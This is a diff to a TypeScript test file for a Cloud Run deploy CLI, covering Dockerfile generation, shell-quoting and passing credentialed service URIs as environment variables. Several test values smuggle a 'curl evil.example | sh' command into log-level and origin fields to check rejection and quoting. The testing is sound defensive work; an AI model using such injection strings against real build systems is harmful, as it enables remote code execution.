@@ -11,6 +11,10 @@ import {
   CreateDockerFileContentOptions,
   deployToCloudRun,
 } from '../../src/cli/deploy/cli_deploy_cloud_run.js';
+import {
+  ARTIFACT_SERVICE_URI_ENV_VAR,
+  SESSION_SERVICE_URI_ENV_VAR,
+} from '../../src/cli/deploy/deploy_utils.js';
 import {A2A_AUTH_TOKEN_ENV_VAR} from '../../src/server/adk_api_server.js';
 import {AgentLoader} from '../../src/utils/agent_loader.js';
 import {
@@ -18,12 +22,16 @@ import {
   isFile,
   isFolderExists,
   loadFileData,
+  saveToFile,
   tryToFindFileRecursively,
 } from '../../src/utils/file_utils.js';
 
 type Callback = (error: Error | null, result?: unknown) => void;
 
 const A2A_TOKEN = 'test-a2a-token';
+const SESSION_URI_PASSWORD = 'sw0rdf1sh';
+const CREDENTIALED_SESSION_URI = `postgresql://adk:${SESSION_URI_PASSWORD}@db.example:5432/adk`;
+const ARTIFACT_URI = 'gs://private-bucket';
 
 const execMock = vi.fn();
 const spawnMock =
@@ -115,23 +123,15 @@ describe('createDockerFileContent', () => {
     expect(content).toContain('--otel_to_cloud');
   });
 
-  it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
+  it('should reject logLevel/allowOrigins containing a newline', () => {
     // These reach the shell-interpreted CMD line via adkServerOptions, so a
-    // newline in any of them breaks out of that Dockerfile instruction the
+    // newline in either of them breaks out of that Dockerfile instruction the
     // same way appName/project/region do.
     for (const [label, value] of [
       ['logLevel', {logLevel: 'info\nRUN sh -c "curl evil.example|sh"\n#'}],
       [
         'allowOrigins',
         {allowOrigins: 'http://a\nRUN sh -c "curl evil.example|sh"\n#'},
-      ],
-      [
-        'sessionServiceUri',
-        {sessionServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#'},
-      ],
-      [
-        'artifactServiceUri',
-        {artifactServiceUri: 'gs://b\nRUN sh -c "curl evil.example|sh"\n#'},
       ],
     ] as const) {
       expect(() =>
@@ -140,22 +140,57 @@ describe('createDockerFileContent', () => {
     }
   });
 
-  it('should shell-quote logLevel/allowOrigins/sessionServiceUri/artifactServiceUri in the CMD line', () => {
+  it('should shell-quote logLevel/allowOrigins in the CMD line', () => {
     // These values reach /bin/sh at container start via the CMD line's
     // shell form, so shell metacharacters must be neutralized by quoting.
     const content = createDockerFileContent({
       ...defaultOptions,
       logLevel: 'info; curl evil.example | sh #',
-      sessionServiceUri: 'memory://; curl evil.example | sh #',
-      artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
+      allowOrigins: 'http://a; curl evil.example | sh #',
     });
     expect(content).toContain("--log_level='info; curl evil.example | sh #'");
     expect(content).toContain(
-      "--session_service_uri='memory://; curl evil.example | sh #'",
+      "--allow_origins='http://a; curl evil.example | sh #'",
+    );
+  });
+
+  it('should reference the service URIs by environment variable instead of embedding them', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      sessionServiceUri: CREDENTIALED_SESSION_URI,
+      artifactServiceUri: ARTIFACT_URI,
+    });
+
+    expect(content).toContain(
+      `--session_service_uri="$${SESSION_SERVICE_URI_ENV_VAR}"`,
     );
     expect(content).toContain(
-      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+      `--artifact_service_uri="$${ARTIFACT_SERVICE_URI_ENV_VAR}"`,
     );
+    expect(content).not.toContain(SESSION_URI_PASSWORD);
+    expect(content).not.toContain('postgresql://');
+    expect(content).not.toContain('private-bucket');
+  });
+
+  it('should not emit an ENV line for the service URIs', () => {
+    // An ENV instruction is baked into the image, which is the exposure the
+    // environment-variable indirection exists to avoid.
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      sessionServiceUri: CREDENTIALED_SESSION_URI,
+      artifactServiceUri: ARTIFACT_URI,
+    });
+
+    expect(content).not.toMatch(/^ENV ADK_/m);
+  });
+
+  it('should omit the service URI flags when no URI is given', () => {
+    const content = createDockerFileContent(defaultOptions);
+
+    expect(content).not.toContain('--session_service_uri');
+    expect(content).not.toContain('--artifact_service_uri');
+    expect(content).not.toContain(SESSION_SERVICE_URI_ENV_VAR);
+    expect(content).not.toContain(ARTIFACT_SERVICE_URI_ENV_VAR);
   });
 
   it('should escape an embedded single quote when shell-quoting', () => {
@@ -211,6 +246,25 @@ describe('createDockerFileContent', () => {
     expect(content).toContain('GOOGLE_CLOUD_PROJECT=my-project.example-123');
   });
 });
+
+/**
+ * Returns the Dockerfile content handed to the mocked `saveToFile`.
+ * `createPackageJson` writes through the same mock, so the call is selected by
+ * path rather than by index.
+ */
+function readGeneratedDockerfile(): string {
+  const call = vi
+    .mocked(saveToFile)
+    .mock.calls.find(([filePath]) => filePath.endsWith('Dockerfile'));
+  if (!call) {
+    expect.fail('no Dockerfile path was passed to saveToFile');
+  }
+  const [, content] = call;
+  if (typeof content !== 'string') {
+    expect.fail(`Dockerfile content was written as ${typeof content}`);
+  }
+  return content;
+}
 
 describe('deployToCloudRun', () => {
   const defaultOptions = {
@@ -466,6 +520,72 @@ describe('deployToCloudRun', () => {
     });
 
     expect(spawnMock.mock.calls[0][1]).toContain('--set-env-vars=FOO=bar');
+  });
+
+  it('should forward the service URIs to Cloud Run as environment variables', async () => {
+    await deployToCloudRun({
+      ...defaultOptions,
+      sessionServiceUri: CREDENTIALED_SESSION_URI,
+      artifactServiceUri: ARTIFACT_URI,
+    });
+
+    const gcloudArgs = spawnMock.mock.calls[0][1];
+    const flagIndex = gcloudArgs.indexOf('--update-env-vars');
+    expect(flagIndex).toBeGreaterThan(-1);
+    expect(gcloudArgs[flagIndex + 1]).toBe(
+      `${SESSION_SERVICE_URI_ENV_VAR}=${CREDENTIALED_SESSION_URI},` +
+        `${ARTIFACT_SERVICE_URI_ENV_VAR}=${ARTIFACT_URI}`,
+    );
+  });
+
+  it('should send the service URIs and the A2A token in a single --update-env-vars', async () => {
+    // gcloud's dict flags do not accumulate, so a second occurrence would drop
+    // whichever variables the first one carried.
+    await deployToCloudRun({
+      ...defaultOptions,
+      sessionServiceUri: CREDENTIALED_SESSION_URI,
+      artifactServiceUri: ARTIFACT_URI,
+      a2a: true,
+      a2aAuthToken: A2A_TOKEN,
+    });
+
+    const gcloudArgs = spawnMock.mock.calls[0][1];
+    expect(
+      gcloudArgs.filter((arg) => arg === '--update-env-vars'),
+    ).toHaveLength(1);
+    const flagIndex = gcloudArgs.indexOf('--update-env-vars');
+    expect(gcloudArgs[flagIndex + 1].split(',')).toEqual([
+      `${SESSION_SERVICE_URI_ENV_VAR}=${CREDENTIALED_SESSION_URI}`,
+      `${ARTIFACT_SERVICE_URI_ENV_VAR}=${ARTIFACT_URI}`,
+      `${A2A_AUTH_TOKEN_ENV_VAR}=${A2A_TOKEN}`,
+    ]);
+  });
+
+  it('should reject a user env-var flag when a service URI is deployed', async () => {
+    await expect(
+      deployToCloudRun({
+        ...defaultOptions,
+        sessionServiceUri: CREDENTIALED_SESSION_URI,
+        extraGcloudArgs: ['--set-env-vars=FOO=bar'],
+      }),
+    ).rejects.toThrow(/conflict with ADK's automatic configuration/);
+  });
+
+  it('should reference the service URI env vars in the staged Dockerfile', async () => {
+    await deployToCloudRun({
+      ...defaultOptions,
+      sessionServiceUri: CREDENTIALED_SESSION_URI,
+      artifactServiceUri: ARTIFACT_URI,
+    });
+
+    const dockerfile = readGeneratedDockerfile();
+    expect(dockerfile).toContain(
+      `--session_service_uri="$${SESSION_SERVICE_URI_ENV_VAR}"`,
+    );
+    expect(dockerfile).toContain(
+      `--artifact_service_uri="$${ARTIFACT_SERVICE_URI_ENV_VAR}"`,
+    );
+    expect(dockerfile).not.toContain(SESSION_URI_PASSWORD);
   });
 
   it('should warn when deploying an A2A surface with no token', async () => {
